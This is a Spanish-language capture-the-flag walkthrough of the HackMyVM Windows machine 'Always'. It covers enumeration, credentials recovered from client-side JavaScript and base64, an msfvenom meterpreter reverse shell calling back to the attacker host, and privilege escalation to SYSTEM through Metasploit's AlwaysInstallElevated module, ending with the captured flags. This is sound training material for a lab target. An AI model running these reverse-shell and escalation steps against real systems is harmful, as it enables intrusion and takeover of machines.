---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Always HackMyVM (Easy - Windows)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-30 03:56 EDT
Nmap scan report for 192.168.1.163
Host is up (0.00028s latency).

PORT      STATE  SERVICE       VERSION
21/tcp    open   ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  closed ms-wbt-server
5357/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open   http          Apache httpd 2.4.57 ((Win64))
|_http-server-header: Apache/2.4.57 (Win64)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: We Are Sorry
|_http-open-proxy: Proxy might be redirecting requests
49152/tcp open   msrpc         Microsoft Windows RPC
49153/tcp open   msrpc         Microsoft Windows RPC
49154/tcp open   msrpc         Microsoft Windows RPC
49155/tcp open   msrpc         Microsoft Windows RPC
49156/tcp open   msrpc         Microsoft Windows RPC
49158/tcp open   msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:6B:C2:A4 (Oracle VirtualBox virtual NIC)
Service Info: Host: ALWAYS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Always-PC
|   NetBIOS computer name: ALWAYS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-03-30T10:57:16+03:00
|_nbstat: NetBIOS name: ALWAYS-PC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:6b:c2:a4 (Oracle VirtualBox virtual NIC)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -59m59s, deviation: 1h43m55s, median: 0s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-30T07:57:16
|_  start_date: 2025-03-30T07:55:24

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.00 seconds
```

Vemos varios puertos interesantes, entre ellos vamos a probar primero el servidor `FTP` de forma anonima:

```shell
ftp anonymous@<IP>
```

Pero veremos que no nos deja, por lo que vamos a probar en el puerto `8080` a ver que encontramos.

Si entramos en dicha pagina veremos lo siguiente:

```
Our Site Is Under Maintenance. Please Come Back Again Later.
```

No encontraremos nada, por lo que vamos a realizar un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.163:8080/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 199]
/.htaccess.html       (Status: 403) [Size: 199]
/.htaccess.php        (Status: 403) [Size: 199]
/.htaccess.txt        (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htpasswd.html       (Status: 403) [Size: 199]
/.htpasswd.php        (Status: 403) [Size: 199]
/.htpasswd.txt        (Status: 403) [Size: 199]
/Admin                (Status: 200) [Size: 3012]
/ADMIN                (Status: 200) [Size: 3012]
/Index.html           (Status: 200) [Size: 178]
/admin                (Status: 200) [Size: 3012]
/aux                  (Status: 403) [Size: 199]
/aux.html             (Status: 403) [Size: 199]
/aux.php              (Status: 403) [Size: 199]
/aux.txt              (Status: 403) [Size: 199]
/cgi-bin/             (Status: 403) [Size: 199]
/cgi-bin/.html        (Status: 403) [Size: 199]
/com1                 (Status: 403) [Size: 199]
/com2                 (Status: 403) [Size: 199]
/com1.txt             (Status: 403) [Size: 199]
/com1.html            (Status: 403) [Size: 199]
/com1.php             (Status: 403) [Size: 199]
/com2.txt             (Status: 403) [Size: 199]
/com2.html            (Status: 403) [Size: 199]
/com2.php             (Status: 403) [Size: 199]
/com3                 (Status: 403) [Size: 199]
/com3.txt             (Status: 403) [Size: 199]
/com3.html            (Status: 403) [Size: 199]
/com3.php             (Status: 403) [Size: 199]
/com4                 (Status: 403) [Size: 199]
/com4.html            (Status: 403) [Size: 199]
/com4.php             (Status: 403) [Size: 199]
/com4.txt             (Status: 403) [Size: 199]
/con                  (Status: 403) [Size: 199]
/con.html             (Status: 403) [Size: 199]
/con.php              (Status: 403) [Size: 199]
/con.txt              (Status: 403) [Size: 199]
/index.html           (Status: 200) [Size: 178]
/lpt1                 (Status: 403) [Size: 199]
/lpt1.html            (Status: 403) [Size: 199]
/lpt1.php             (Status: 403) [Size: 199]
/lpt1.txt             (Status: 403) [Size: 199]
/lpt2                 (Status: 403) [Size: 199]
/lpt2.html            (Status: 403) [Size: 199]
/lpt2.php             (Status: 403) [Size: 199]
/lpt2.txt             (Status: 403) [Size: 199]
/nul                  (Status: 403) [Size: 199]
/nul.html             (Status: 403) [Size: 199]
/nul.php              (Status: 403) [Size: 199]
/nul.txt              (Status: 403) [Size: 199]
/prn                  (Status: 403) [Size: 199]
/prn.html             (Status: 403) [Size: 199]
/prn.php              (Status: 403) [Size: 199]
/prn.txt              (Status: 403) [Size: 199]
/secci�               (Status: 403) [Size: 199]
/secci�.php           (Status: 403) [Size: 199]
/secci�.txt           (Status: 403) [Size: 199]
/secci�.html          (Status: 403) [Size: 199]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos un directorio bastante interesante llamado `/admin` por lo que vamos a entrar para ver que vemos:

```
URL = http://<IP>/admin
```

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Vemos un `login`, si probamos las credenciales por defecto `admin:admin` veremos que no nos deja, pero si inspeccionamos la pagina veremos el siguiente `JS`.

```html
<script>
        function validateForm() {
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            const errorMessage = document.getElementById("errorMessage");
            
            if (username === "admin" && password === "adminpass123") {
                return true; 
            }
            errorMessage.textContent = "Invalid Username Or Password!";
            return false; 
        }
</script>
```

Vemos que se esta comparando con unas credenciales, por lo que vamos a probar a meterlas, haciendo eso veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que es un codigo en `Base64`, pero si lo decodificamos veremos lo siguiente:

```shell
echo "ZnRwdXNlcjpLZWVwR29pbmdCcm8hISE=" | base64 -d
```

Info:

```
ftpuser:KeepGoingBro!!!
```

Vemos que pueden ser las credenciales del servidor de `FTP`, por lo que vamos a probarlas.

## FTP

```shell
ftp ftpuser@<IP>
```

Metemos como contraseña `KeepGoingBro!!!` y veremos que estaremos dentro, si listamos el servidor veremos lo siguiente:

```
229 Entering Extended Passive Mode (|||49159|)
150 Opening ASCII mode data connection.
10-01-24  08:17PM                   56 robots.txt
226 Transfer complete.
```

Vamos a descargarnoslo de la siguiente forma:

```shell
get robots.txt
```

Ahora si leemos el archivo, veremos lo siguiente:

```
User-agent: *
Disallow: /admins-secret-pagexxx.html
```

Si metemos directamente el `/admins-secret-pagexxx.html` veremos que funciona y veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que nos esta proporcionando otras credenciales del usuario `always` pero la contraseña esta codificada en `Base64`, pero si la decodificamos veremos lo siguiente:

```shell
echo "WW91Q2FudEZpbmRNZS4hLiE=" | base64 -d
```

Info:

```
YouCantFindMe.!.!
```

## Escalate user ftpuser

Pero si lo probamos en la maquina `Windows` no nos servira, pero el que si nos servira sera el del `ftpuser`:

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Una vez que iniciemos sesion, estaremos dentro de la version escritorio de `Windows` con dicho usuario, por lo que vamos a generarnos una `reverse shell` con `msfvenom` ya que tenemos las credenciales de un usuario.

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

Una vez generado el binario de la `shell` vamos a pasarnoslo a la maquina victima abriendo un servidor de `python3`:

```shell
python3 -m http.server 8000
```

En la maquina victima abriremos el navegador y buscaremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

Desde aqui nos descargamos la `shell` que hemos generado, una vez echo esto vamos a ponernos a la escucha desde `metasploit`.

```shell
msfconsole -q
```

Utilizaremos la siguiente escucha:

```shell
use multi/handler
```

Ahora lo vamos a configurar de la siguiente forma:

```shell
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <IP_ATTACKER>
set LPORT <PORT>
run
```

Ahora desde la maquina victima ejecutamos el archivo `shell.exe` y si volvemos a donde tenemos la escucha veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

```
[*] Started reverse TCP handler on 192.168.1.146:7777 
[*] Sending stage (177734 bytes) to 192.168.1.163
[*] Meterpreter session 1 opened (192.168.1.146:7777 -> 192.168.1.163:49181) at 2025-03-30 04:37:37 -0400

meterpreter > getuid
Server username: Always-PC\ftpuser
```

Vemos que ya obtuvimos la `shell` con un `meterpreter`.

## Escalate Privileges

Ahora que tenemos un `meterpreter` vamos a utilizar un modulo de `metasploit` llamado `suggester` para ver que vulnerabilidades puede tener esta maquina para poder ser `administradores`.

Vamos a dejar en segundo plano la sesion `Ctrl+Z` y despues le daremos a `Y`, una vez que hayamos dejado em segundo plano la sesion haremos lo siguiente:

```shell
use post/multi/recon/local_exploit_suggester
```

Ahora vamos a configurarlo:

```shell
set SESSION <ID_SESSION>
set SHOWDESCRIPTION true
exploit
```

Info:

```
[*] 192.168.1.163 - Collecting local exploits for x86/windows...
[*] 192.168.1.163 - 198 exploit checks are being tried...
[+] 192.168.1.163 - exploit/windows/local/always_install_elevated: The target is vulnerable.
  This module checks the AlwaysInstallElevated registry keys which 
  dictates if .MSI files should be installed with elevated privileges 
  (NT AUTHORITY\SYSTEM). The generated .MSI file has an embedded 
  executable which is extracted and run by the installer. After 
  execution the .MSI file intentionally fails installation (by calling 
  some invalid VBS) to prevent it being registered on the system. By 
  running this with the /quiet argument the error will not be seen by 
  the user.
[+] 192.168.1.163 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
  This module will bypass Windows UAC by creating COM handler registry 
  entries in the HKCU hive. When certain high integrity processes are 
  loaded, these registry entries are referenced resulting in the 
  process loading user-controlled DLLs. These DLLs contain the 
  payloads that result in elevated sessions. Registry key 
  modifications are cleaned up after payload invocation. This module 
  requires the architecture of the payload to match the OS, but the 
  current low-privilege Meterpreter session architecture can be 
  different. If specifying EXE::Custom your DLL should call 
  ExitProcess() after starting your payload in a separate process. 
  This module invokes the target binary via cmd.exe on the target. 
  Therefore if cmd.exe access is restricted, this module will not run 
  correctly.
[+] 192.168.1.163 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
  This module will bypass Windows UAC by hijacking a special key in 
  the Registry under the current user hive, and inserting a custom 
  command that will get invoked when the Windows Event Viewer is 
  launched. It will spawn a second shell that has the UAC flag turned 
  off. This module modifies a registry key, but cleans up the key once 
  the payload has been invoked. The module does not require the 
  architecture of the payload to match the OS. If specifying 
  EXE::Custom your DLL should call ExitProcess() after starting your 
  payload in a separate process.
[+] 192.168.1.163 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
  This module exploits CVE-2020-0787, an arbitrary file move 
  vulnerability in outdated versions of the Background Intelligent 
  Transfer Service (BITS), to overwrite 
  C:\Windows\System32\WindowsCoreDeviceInfo.dll with a malicious DLL 
  containing the attacker's payload. To achieve code execution as the 
  SYSTEM user, the Update Session Orchestrator service is then 
  started, which will result in the malicious 
  WindowsCoreDeviceInfo.dll being run with SYSTEM privileges due to a 
  DLL hijacking issue within the Update Session Orchestrator Service. 
  Note that presently this module only works on Windows 10 and Windows 
  Server 2016 and later as the Update Session Orchestrator Service was 
  only introduced in Windows 10. Note that only Windows 10 has been 
  tested, so your mileage may vary on Windows Server 2016 and later.
[+] 192.168.1.163 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
  This module exploits the Task Scheduler 2.0 XML 0day exploited by 
  Stuxnet. When processing task files, the Windows Task Scheduler only 
  uses a CRC32 checksum to validate that the file has not been 
  tampered with. Also, In a default configuration, normal users can 
  read and write the task files that they have created. By modifying 
  the task file and creating a CRC32 collision, an attacker can 
  execute arbitrary commands with SYSTEM privileges. NOTE: Thanks to 
  webDEViL for the information about disable/enable.
[+] 192.168.1.163 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
  This module exploits a NULL Pointer Dereference in win32k.sys, the 
  vulnerability can be triggered through the use of TrackPopupMenu. 
  Under special conditions, the NULL pointer dereference can be abused 
  on xxxSendMessageTimeout to achieve arbitrary code execution. This 
  module has been tested successfully on Windows XP SP3, Windows 2003 
  SP2, Windows 7 SP1 and Windows 2008 32bits. Also on Windows 7 SP1 
  and Windows 2008 R2 SP1 64 bits.
[+] 192.168.1.163 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
  This module exploits improper object handling in the win32k.sys 
  kernel mode driver. This module has been tested on vulnerable builds 
  of Windows 7 x64 and x86, and Windows 2008 R2 SP1 x64.
[+] 192.168.1.163 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
  This module exploits a NULL pointer dereference vulnerability in 
  MNGetpItemFromIndex(), which is reachable via a NtUserMNDragOver() 
  system call. The NULL pointer dereference occurs because the 
  xxxMNFindWindowFromPoint() function does not effectively check the 
  validity of the tagPOPUPMENU objects it processes before passing 
  them on to MNGetpItemFromIndex(), where the NULL pointer dereference 
  will occur. This module has been tested against Windows 7 x86 SP0 
  and SP1. Offsets within the solution may need to be adjusted to work 
  with other versions of Windows, such as Windows Server 2008.
[+] 192.168.1.163 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
  This module leverages a UAC bypass (TokenMagic) in order to spawn a 
  process/conduct a DLL hijacking attack to gain SYSTEM-level 
  privileges. Windows 7 through Windows 10 1803 are affected.
[*] Running check method for exploit 42 / 42
[*] 192.168.1.163 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/always_install_elevated                  Yes                      The target is vulnerable.
 2   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!                                                                                                              
 5   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
```

El `exploit` que nos llama la atencion es el siguiente:

```
[+] 192.168.1.163 - exploit/windows/local/always_install_elevated: The target is vulnerable.
  This module checks the AlwaysInstallElevated registry keys which 
  dictates if .MSI files should be installed with elevated privileges 
  (NT AUTHORITY\SYSTEM). The generated .MSI file has an embedded 
  executable which is extracted and run by the installer. After 
  execution the .MSI file intentionally fails installation (by calling 
  some invalid VBS) to prevent it being registered on the system. By 
  running this with the /quiet argument the error will not be seen by 
  the user.
```

Por lo que vamos a utilizarlo.

```shell
use exploit/windows/local/always_install_elevated
```

Ahora vamos a configurarlo:

```shell
set SESSION <ID_SESSION>
set LHOST <IP_ATTACKER>
set LPORT <PORT>
exploit
```

Info:

```
[*] Started reverse TCP handler on 192.168.1.146:5555 
[*] Uploading the MSI to C:\Users\ftpuser\AppData\Local\Temp\danJqVOY.msi ...
[*] Executing MSI...
[*] Sending stage (177734 bytes) to 192.168.1.163
[+] Deleted C:\Users\ftpuser\AppData\Local\Temp\danJqVOY.msi
[*] Meterpreter session 2 opened (192.168.1.146:5555 -> 192.168.1.163:49182) at 2025-03-30 04:47:26 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Vemos que ha funcionado y ya seremos `Administradores` por lo que leeremos la `flags` del usuario y del `admin`.

> user.txt

```
HMV{You_Found_Me!}
```

> root.txt

```
HMV{White_Flag_Raised}
```
